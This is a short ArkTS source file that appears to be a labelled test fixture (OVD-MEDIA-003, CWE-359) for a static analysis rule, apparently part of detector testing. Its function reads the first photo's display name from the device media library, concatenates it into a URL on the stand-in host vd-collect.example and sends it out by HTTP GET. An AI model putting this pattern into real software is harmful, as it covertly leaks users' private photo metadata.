// VULN: OVD-MEDIA-003 相册条目元数据拼接外传（string-op-flow：concat → 外传，CWE-359）
// 规则语义：字符串拼接算子 concat 与收集端点字面量在 record 域共同出现
import { photoAccessHelper } from '@kit.MediaLibraryKit';
import { common } from '@kit.AbilityKit';
import { BusinessError } from '@kit.BasicServicesKit';
import { http } from '@kit.NetworkKit';

export async function ovdMedia003(ctx: common.UIAbilityContext): Promise<string> {
  const helper = photoAccessHelper.getPhotoAccessHelper(ctx);
  let name = 'unnamed.jpg';
  let err = '';
  try {
    const result = await helper.getAssets({} as photoAccessHelper.FetchOptions);
    if (result.getCount() > 0) {
      const first = await result.getFirstObject();
      name = first.displayName;
    }
    result.close();
  } catch (e) {
    err = ` (fetch err=${(e as BusinessError).code})`;
  }
  // 拼接：显示名拼进收集端点查询串后外传
  const url = 'https://vd-collect.example/media-meta?name='.concat(name);
  let err2 = '';
  try {
    const req: http.HttpRequest = http.createHttp();
    req.request(url, { method: http.RequestMethod.GET, readTimeout: 3000, connectTimeout: 3000 })
      .catch(() => {});
    req.destroy();
  } catch (e) {
    err2 = ` (req err=${(e as BusinessError).code})`;
  }
  return `metadata concat-exfil armed: ${url}${err}${err2}`;
}
